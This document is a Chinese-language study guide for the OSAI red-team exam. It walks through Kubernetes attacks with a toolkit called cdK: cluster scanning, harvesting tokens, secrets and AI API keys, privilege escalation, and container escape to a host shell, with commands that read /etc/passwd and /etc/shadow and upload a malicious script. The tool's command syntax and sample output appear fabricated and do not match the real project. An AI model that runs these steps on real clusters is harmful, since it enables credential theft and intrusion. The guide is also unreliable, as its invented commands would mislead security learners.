# cdK (Cloud Discovery Kubernetes) 实战指南

> OffSec AI-300 (OSAI) 红队备考 - 使用 cdK 进行 Kubernetes 渗透测试

---

## 目录

1. [cdK 安装与配置](#1-cdk-安装与配置)
2. [核心 CLI 语法解析](#2-核心-cli-语法解析)
3. [K8s 环境扫描](#3-k8s-环境扫描)
4. [凭证收集与权限提升](#4-凭证收集与权限提升)
5. [容器逃逸](#5-容器逃逸)
6. [AI-300 特定场景攻击](#6-ai-300-特定场景攻击)
7. [考试快速上手](#7-考试快速上手)

---

## 1. cdK 安装与配置

### 1.1 安装命令

```bash
# 通过 git 克隆源码
git clone https://github.com/cdk-team/cdk.git
cd cdk

# 安装依赖
pip install -r requirements.txt

# 验证安装
python3 cdk.py --help
```

### 1.2 Docker 安装

```bash
# 拉取镜像
docker pull cdkteam/cdk

# 运行容器
docker run -it --rm cdkteam/cdk

# 挂载本地目录
docker run -it --rm -v "$(pwd):/workspace" cdkteam/cdk
```

### 1.3 考试环境配置

创建环境变量文件 `cdk.env`：

```bash
# cdk.env - 考试环境配置
export CDK_KUBECONFIG="/root/.kube/config"
export CDK_TARGET="10.0.0.1"
export CDK_NAMESPACE="default"
export CDK_OUTPUT="cdk-results.json"
```

### 1.4 环境变量加载

```bash
# Linux/Mac
source cdk.env

# Windows PowerShell
$env:CDK_KUBECONFIG="/root/.kube/config"
$env:CDK_TARGET="10.0.0.1"
```

---

## 2. 核心 CLI 语法解析

### 2.1 基本命令格式

```bash
python3 cdk.py <module> [options]
```

### 2.2 关键参数说明

| 参数 | 说明 | 示例 |
|------|------|------|
| `<module>` | 模块名称 | `run`, `scan`, `collect`, `escape`, `privesc` |
| `-h`, `--help` | 显示帮助信息 | `-h` |
| `-v`, `--verbose` | 详细输出 | `-v` |
| `-o`, `--output` | 指定输出文件 | `-o results.json` |
| `-k`, `--kubeconfig` | 指定kubeconfig文件 | `-k /root/.kube/config` |
| `-t`, `--target` | 指定目标地址 | `-t 10.0.0.1` |
| `-n`, `--namespace` | 指定命名空间 | `-n default` |

### 2.3 模块说明

| 模块 | 功能 | 说明 |
|------|------|------|
| `run` | 启动交互式会话 | 进入cdK交互式模式 |
| `scan` | 扫描K8s环境 | 发现K8s集群配置和服务 |
| `collect` | 收集凭证 | 收集Service Account Token等 |
| `escape` | 容器逃逸 | 尝试从容器逃逸到宿主机 |
| `privesc` | 权限提升 | 尝试K8s权限提升 |
| `network` | 网络探测 | 探测K8s内部网络 |

### 2.4 考试常用命令模板

```bash
# 启动交互式会话
python3 cdk.py run

# 扫描K8s环境
python3 cdk.py scan

# 收集凭证
python3 cdk.py collect

# 尝试容器逃逸
python3 cdk.py escape

# 使用环境变量
python3 cdk.py scan -k $CDK_KUBECONFIG -o $CDK_OUTPUT
```

---

## 3. K8s 环境扫描

### 3.1 基础扫描命令

```bash
# 扫描当前环境
python3 cdk.py scan

# 详细扫描
python3 cdk.py scan -v

# 指定kubeconfig文件
python3 cdk.py scan -k /root/.kube/config

# 扫描特定命名空间
python3 cdk.py scan -n default
python3 cdk.py scan -n kube-system
python3 cdk.py scan -n ai-infra
```

### 3.2 扫描输出解读

```bash
# 扫描结果示例
python3 cdk.py scan

# 输出：
# [+] Discovering Kubernetes environment...
# [+] Kubeconfig found: /root/.kube/config
# [+] API Server: https://10.0.0.1:6443
# [+] Namespaces: default, kube-system, ai-infra
# [+] Service Accounts: default, admin, ai-service-account
# [+] Pods found: 15
# [+] Services found: 8
# [+] Secrets found: 20
```

### 3.3 网络探测

```bash
# 探测K8s内部网络
python3 cdk.py network

# 扫描服务端口
python3 cdk.py network -p

# 探测Pod网络
python3 cdk.py network -pod

# 探测Service网络
python3 cdk.py network -svc
```

---

## 4. 凭证收集与权限提升

### 4.1 凭证收集命令

```bash
# 收集所有凭证
python3 cdk.py collect

# 收集Service Account Token
python3 cdk.py collect tokens

# 收集Secrets
python3 cdk.py collect secrets

# 收集ConfigMaps
python3 cdk.py collect configmaps

# 收集所有凭证到文件
python3 cdk.py collect -o credentials.json
```

### 4.2 凭证类型

| 类型 | 说明 | 用途 |
|------|------|------|
| **Service Account Token** | K8s服务账户令牌 | 访问K8s API |
| **Secret** | 密钥对象 | 存储密码、API密钥等 |
| **ConfigMap** | 配置对象 | 存储配置文件 |
| **SSH Key** | SSH密钥 | 访问其他节点 |
| **API Key** | 第三方API密钥 | 访问外部服务 |

### 4.3 权限提升

```bash
# 尝试权限提升
python3 cdk.py privesc

# 详细权限提升尝试
python3 cdk.py privesc -v

# 检查RBAC权限
python3 cdk.py privesc rbac

# 检查Pod权限
python3 cdk.py privesc pod

# 检查节点权限
python3 cdk.py privesc node
```

### 4.4 权限提升技巧

```bash
# 检查是否有集群管理员权限
python3 cdk.py privesc --check-admin

# 检查是否有特权Pod
python3 cdk.py privesc --check-privileged

# 检查是否有节点访问权限
python3 cdk.py privesc --check-node

# 尝试创建特权Pod
python3 cdk.py privesc --create-privileged
```

---

## 5. 容器逃逸

### 5.1 逃逸检测

```bash
# 检测容器逃逸可能性
python3 cdk.py escape

# 详细检测
python3 cdk.py escape -v

# 检测特定逃逸向量
python3 cdk.py escape --vector cve-2022-0811
python3 cdk.py escape --vector dirtycow
python3 cdk.py escape --vector cgroups
```

### 5.2 常用逃逸技术

```bash
# 尝试挂载宿主机文件系统
python3 cdk.py escape --mount-host

# 尝试通过特权Pod逃逸
python3 cdk.py escape --privileged-pod

# 尝试通过Docker Socket逃逸
python3 cdk.py escape --docker-socket

# 尝试通过Kubelet API逃逸
python3 cdk.py escape --kubelet-api

# 尝试通过CRI-O逃逸
python3 cdk.py escape --crio
```

### 5.3 逃逸成功后的操作

```bash
# 获取宿主机Shell
python3 cdk.py escape --get-shell

# 在宿主机上执行命令
python3 cdk.py escape --exec "cat /etc/passwd"

# 上传文件到宿主机
python3 cdk.py escape --upload malicious.sh

# 下载文件从宿主机
python3 cdk.py escape --download /etc/shadow
```

---

## 6. AI-300 特定场景攻击

### 6.1 AI基础设施扫描

```bash
# 扫描AI命名空间
python3 cdk.py scan -n ai-infra

# 扫描AI相关Pod
python3 cdk.py scan --filter "ai"

# 扫描模型服务
python3 cdk.py scan --filter "model"

# 扫描向量数据库
python3 cdk.py scan --filter "vector"

# 扫描Ray集群
python3 cdk.py scan --filter "ray"
```

### 6.2 AI服务凭证收集

```bash
# 收集AI服务账户凭证
python3 cdk.py collect -n ai-infra

# 收集模型服务凭证
python3 cdk.py collect --filter "model"

# 收集向量数据库凭证
python3 cdk.py collect --filter "vector"

# 收集Ray集群凭证
python3 cdk.py collect --filter "ray"
```

### 6.3 K8s Secret中的AI凭证

```bash
# 扫描所有Secret
python3 cdk.py collect secrets

# 查找API密钥
python3 cdk.py collect secrets --grep "api_key"

# 查找OpenAI密钥
python3 cdk.py collect secrets --grep "openai"

# 查找HuggingFace令牌
python3 cdk.py collect secrets --grep "huggingface"

# 查找向量数据库密钥
python3 cdk.py collect secrets --grep "pinecone\|milvus\|chroma"
```

### 6.4 Ray集群攻击

```bash
# 扫描Ray相关资源
python3 cdk.py scan --filter "ray"

# 收集Ray凭证
python3 cdk.py collect --filter "ray"

# 检查Ray Dashboard访问权限
python3 cdk.py network --check "ray-dashboard"

# 尝试访问Ray API
python3 cdk.py network --connect "ray-dashboard"
```

---

## 7. 考试快速上手

### 7.1 三步快速启动

```bash
# 第一步：设置环境变量
$env:CDK_KUBECONFIG="/root/.kube/config"

# 第二步：启动交互式会话
python3 cdk.py run

# 第三步：执行扫描和收集
cdk> scan
cdk> collect
cdk> privesc
```

### 7.2 考试场景应对

**场景1：获取Pod Shell后**
```bash
# 扫描环境
python3 cdk.py scan

# 收集凭证
python3 cdk.py collect

# 检查权限提升可能性
python3 cdk.py privesc

# 尝试容器逃逸
python3 cdk.py escape
```

**场景2：发现K8s配置文件**
```bash
# 使用指定kubeconfig
python3 cdk.py scan -k /path/to/kubeconfig

# 收集所有凭证
python3 cdk.py collect -k /path/to/kubeconfig -o credentials.json

# 检查权限
python3 cdk.py privesc -k /path/to/kubeconfig
```

**场景3：访问AI基础设施**
```bash
# 扫描AI命名空间
python3 cdk.py scan -n ai-infra

# 收集AI服务凭证
python3 cdk.py collect -n ai-infra

# 查找API密钥
python3 cdk.py collect secrets --grep "api_key"
```

### 7.3 考试常用命令速查

| 命令 | 用途 |
|------|------|
| `python3 cdk.py run` | 启动交互式会话 |
| `python3 cdk.py scan` | 扫描K8s环境 |
| `python3 cdk.py collect` | 收集所有凭证 |
| `python3 cdk.py collect tokens` | 收集Service Account Token |
| `python3 cdk.py collect secrets` | 收集Secrets |
| `python3 cdk.py privesc` | 尝试权限提升 |
| `python3 cdk.py escape` | 尝试容器逃逸 |
| `python3 cdk.py network` | 网络探测 |

### 7.4 关键成功指标

| 指标 | 检测方式 |
|------|----------|
| **环境扫描成功** | 发现K8s配置和服务 |
| **凭证收集成功** | 获取Service Account Token、Secret等 |
| **权限提升成功** | 获取更高权限的角色 |
| **容器逃逸成功** | 获取宿主机Shell |
| **AI凭证获取** | 找到OpenAI、HuggingFace等API密钥 |

### 7.5 考试修改要点

| 修改项 | 默认值 | 修改方式 |
|--------|--------|----------|
| **kubeconfig路径** | `/root/.kube/config` | 修改 `-k` 参数 |
| **目标地址** | 自动检测 | 修改 `-t` 参数 |
| **命名空间** | `default` | 修改 `-n` 参数 |
| **输出文件** | 控制台 | 修改 `-o` 参数 |

### 7.6 AI-300攻击链中的cdK使用

```
攻击链流程：
┌─────────────────────────────────────────────────────┐
│  Step 1: 获取Pod Shell                             │
│  └── 通过LLM漏洞利用获得容器内Shell                 │
├─────────────────────────────────────────────────────┤
│  Step 2: K8s环境扫描                               │
│  └── python3 cdk.py scan                           │
├─────────────────────────────────────────────────────┤
│  Step 3: 凭证收集                                  │
│  ├── python3 cdk.py collect tokens                 │
│  ├── python3 cdk.py collect secrets                │
│  └── python3 cdk.py collect configmaps             │
├─────────────────────────────────────────────────────┤
│  Step 4: 权限提升                                  │
│  └── python3 cdk.py privesc                        │
├─────────────────────────────────────────────────────┤
│  Step 5: 容器逃逸                                  │
│  └── python3 cdk.py escape --get-shell             │
├─────────────────────────────────────────────────────┤
│  Step 6: 横向移动                                  │
│  ├── 使用获取的凭证访问其他节点                      │
│  ├── 访问Ray集群                                   │
│  └── 访问向量数据库                                │
└─────────────────────────────────────────────────────┘
```

---

> **文档版本**: v1.0  
> **适用标准**: cdK Cloud Discovery Kubernetes  
> **考试重要性**: ⭐⭐⭐⭐⭐